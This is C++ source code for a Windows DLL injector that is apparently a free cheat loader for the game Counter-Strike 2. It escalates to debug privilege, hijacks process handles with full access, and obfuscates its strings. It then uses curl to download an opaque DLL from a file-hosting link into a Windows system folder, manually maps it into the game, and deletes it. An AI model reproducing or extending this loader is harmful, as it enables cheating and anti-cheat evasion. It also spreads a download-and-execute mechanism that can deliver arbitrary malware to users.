#define _HAS_STD_BYTE  0
#include "injector.h"
#include "hijacking.h"
#include "x.hpp"

OBJECT_ATTRIBUTES InitObjectAttributes(PUNICODE_STRING name, ULONG attributes, HANDLE hRoot, PSECURITY_DESCRIPTOR security) {
	OBJECT_ATTRIBUTES object;

	object.Length = sizeof(OBJECT_ATTRIBUTES);
	object.ObjectName = name;
	object.Attributes = attributes;
	object.RootDirectory = hRoot;
	object.SecurityDescriptor = security;

	return object;
}

SYSTEM_HANDLE_INFORMATION* hInfo;
HANDLE procHandle = NULL;
HANDLE hProcess = NULL;
HANDLE HijackedHandle = NULL;

bool IsHandleValid(HANDLE handle) {
	if (handle && handle != INVALID_HANDLE_VALUE) return true;

	return false;
}

bool IsCorrectTargetArchitecture(HANDLE hProc) {
	BOOL bTarget = FALSE;
	if (!IsWow64Process(hProc, &bTarget)) {
		return false;
	}

	BOOL bHost = FALSE;
	IsWow64Process(GetCurrentProcess(), &bHost);

	return (bTarget == bHost);
}

DWORD GetProcessIdByName(wchar_t* name) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (_wcsicmp(entry.szExeFile, name) == 0) {
				CloseHandle(snapshot);

				return entry.th32ProcessID;
			}
		}
	}

	CloseHandle(snapshot);

	return 0;
}

HANDLE HijackExistingHandle(DWORD dwTargetProcessId) {
	HMODULE Ntdll = GetModuleHandleA(X("ntdll"));
	_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(Ntdll, X("RtlAdjustPrivilege"));
	boolean OldPriv;
	RtlAdjustPrivilege(SeDebugPriv, TRUE, FALSE, &OldPriv);
	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(Ntdll, X("NtQuerySystemInformation"));
	_NtDuplicateObject NtDuplicateObject = (_NtDuplicateObject)GetProcAddress(Ntdll, X("NtDuplicateObject"));
	_NtOpenProcess NtOpenProcess = (_NtOpenProcess)GetProcAddress(Ntdll, X("NtOpenProcess"));
	OBJECT_ATTRIBUTES Obj_Attribute = InitObjectAttributes(NULL, NULL, NULL, NULL);
	CLIENT_ID clientID = { 0 };
	DWORD size = sizeof(SYSTEM_HANDLE_INFORMATION);

	hInfo = (SYSTEM_HANDLE_INFORMATION*) new byte[size];

	ZeroMemory(hInfo, size);

	NTSTATUS NtRet = NULL;

	do {
        delete[] hInfo;

		size *= 1.5;

		try {
			hInfo = (PSYSTEM_HANDLE_INFORMATION) new byte[size];
		}
		catch (std::bad_alloc) {
			exit(0);
		}

		Sleep(1);

	} while ((NtRet = NtQuerySystemInformation(SystemHandleInformation, hInfo, size, NULL)) == STATUS_INFO_LENGTH_MISMATCH);

	if (!NT_SUCCESS(NtRet)) exit(0);

	for (unsigned int i = 0; i < hInfo->HandleCount; ++i) {
		static DWORD NumOfOpenHandles;

        GetProcessHandleCount(GetCurrentProcess(), &NumOfOpenHandles);

        if (NumOfOpenHandles > 500) {
            printf(X("[ lumina ] Too many open handles (%lu), exiting to avoid leak\n"), NumOfOpenHandles);
            Sleep(2000);
            delete[](BYTE*)hInfo;
            exit(0);
        }

		if (!IsHandleValid((HANDLE)hInfo->Handles[i].Handle) || hInfo->Handles[i].ObjectTypeNumber != ProcessHandleType) continue;

		clientID.UniqueProcess = (DWORD*)hInfo->Handles[i].ProcessId;

		procHandle ? CloseHandle(procHandle) : 0;

		NtRet = NtOpenProcess(&procHandle, PROCESS_DUP_HANDLE, &Obj_Attribute, &clientID);
		if (!IsHandleValid(procHandle) || !NT_SUCCESS(NtRet)) continue;

		NtRet = NtDuplicateObject(procHandle, (HANDLE)hInfo->Handles[i].Handle, NtCurrentProcess, &HijackedHandle, PROCESS_ALL_ACCESS, 0, 0);
		if (!IsHandleValid(HijackedHandle) || !NT_SUCCESS(NtRet)) continue;

		if (GetProcessId(HijackedHandle) != dwTargetProcessId) {
			CloseHandle(HijackedHandle);
			continue;
		}

		hProcess = HijackedHandle;

		break;
	}

	return hProcess;
}

bool StartCS2() {
	SHELLEXECUTEINFOA sei = {};
	sei.cbSize = sizeof(sei);
	sei.lpVerb = X("open");
	sei.lpFile = X("steam://rungameid/730");
	sei.nShow = SW_SHOW;
	sei.fMask = SEE_MASK_NOCLOSEPROCESS;

	if (ShellExecuteExA(&sei)) {
		if (sei.hProcess) {
			CloseHandle(sei.hProcess);
		}

		return true;
	}

	return false;
}

void lol() {
    char title[128];
    sprintf_s(title, sizeof(title), "luminacheats.com | Built: %s %s | Version: Free CS2", __DATE__, __TIME__);
    SetConsoleTitleA(title);

	system(X("cls"));
	
	printf(X(R"(
 ___       ___  ___  _____ ______   ___  ________   ________     
|\  \     |\  \|\  \|\   _ \  _   \|\  \|\   ___  \|\   __  \    
\ \  \    \ \  \\\  \ \  \\\__\ \  \ \  \ \  \\ \  \ \  \|\  \   
 \ \  \    \ \  \\\  \ \  \\|__| \  \ \  \ \  \\ \  \ \   __  \  
  \ \  \____\ \  \\\  \ \  \    \ \  \ \  \ \  \\ \  \ \  \ \  \ 
   \ \_______\ \_______\ \__\    \ \__\ \__\ \__\\ \__\ \__\ \__\
    \|_______|\|_______|\|__|     \|__|\|__|\|__| \|__|\|__|\|__|

[1] Inject Cheat
[2] Exit
)"));
	printf(X("\nSelect option: "));
}

int main() {
    const char* DllDestination = X("C:\\Windows\\Branding\\lumina.dll");
    int Option = 0;

    lol();
    scanf_s(X("%d"), &Option);

    if (Option == 1) {
        DWORD PID = GetProcessIdByName((wchar_t*)L"cs2.exe");
        if (PID == 0) {
            printf(X("\n[ lumina ] CS2 is not running... Should we start it for you? [y/n]\n"));
            char choice;
            scanf_s(X(" %c"), &choice, 1);

            if (choice == 'y' || choice == 'Y') {
                printf(X("[ lumina ] Starting CS2...\n"));
                if (StartCS2()) {
                    printf(X("[ lumina ] CS2 is starting. Please wait a moment and try again.\n"));
                }
                else {
                    printf(X("[ lumina ] Failed to start CS2. Please start it manually!\n"));
                }
            }
        }

        system(X("cls"));

        printf(X("[ lumina ] Downloading DLL from server...\n"));
        int result = system(X("curl -s https://files.catbox.moe/qouiw7.dll -o C:\\Windows\\Branding\\lumina.dll"));
        if (result != 0) {
            printf(X("[ lumina ] Failed to download DLL.\n"));
            system(X("pause"));
            return NULL;
        }

        Sleep(2500);

        printf(X("[ lumina ] Injecting into CS2...\n"));

        Sleep(2500);

        HANDLE hProc = HijackExistingHandle(PID);
        if (!hProc) {
            DWORD Err = GetLastError();
            printf(X("[ lumina ] HijackExistingHandle failed. LastError: %lu\n"), Err);
            system(X("pause"));
            return NULL;
        }

        if (!IsCorrectTargetArchitecture(hProc)) {
            printf(X("[ lumina ] Architecture mismatch.\n"));
            CloseHandle(hProc);
            system(X("pause"));
            return NULL;
        }

        if (GetFileAttributesA(DllDestination) == INVALID_FILE_ATTRIBUTES) {
            printf(X("[ lumina ] DLL does not exist.\n"));
            CloseHandle(hProc);
            system(X("pause"));
            return NULL;
        }

        std::ifstream File(DllDestination, std::ios::binary | std::ios::ate);
        if (File.fail()) {
            printf(X("[ lumina ] Failed to open DLL for reading.\n"));
            CloseHandle(hProc);
            system(X("pause"));
            return NULL;
        }

        auto FileSize = File.tellg();
        if (FileSize < 0x1000) {
            printf(X("[ lumina ] DLL size too small. Size: %lld\n"), FileSize);
            CloseHandle(hProc);
            system(X("pause"));
            return NULL;
        }

        BYTE* pSrcData = new BYTE[(UINT_PTR)FileSize];
        if (!pSrcData) {
            printf(X("[ lumina ] Failed to allocate memory for DLL.\n"));
            CloseHandle(hProc);
            system(X("pause"));
            return NULL;
        }

        File.seekg(0, std::ios::beg);
        File.read((char*)(pSrcData), FileSize);
        File.close();

        if (!ManualMapDll(hProc, pSrcData, FileSize)) {
            printf(X("[ lumina ] Injection failed...\n"));
            delete[] pSrcData;
            CloseHandle(hProc);
            if (DeleteFileA(DllDestination)) {
                printf(X("[ lumina ] DLL deleted successfully. <- IGNORE\n"));
            } else {
                printf(X("[ lumina ] Failed to delete DLL. <- IGNORE\n"));
            }
            system(X("pause"));
            return NULL;
        }

        delete[] pSrcData;
        CloseHandle(hProc);
        if (DeleteFileA(DllDestination)) {
            printf(X("[ lumina ] DLL deleted successfully. <- IGNORE\n"));
        } else {
            printf(X("[ lumina ] Failed to delete DLL. <- IGNORE\n"));
        }

        printf(X("[ lumina ] Injection successful!\n"));
        system(X("pause"));
    }
    else if (Option == 2) {
        printf(X("[ lumina ] Exiting...\n"));
        Sleep(1000);
        exit(0);
    }
    else {
        printf(X("[ lumina ] Invalid selection...\n"));
        system(X("pause"));
    }

    return NULL;
}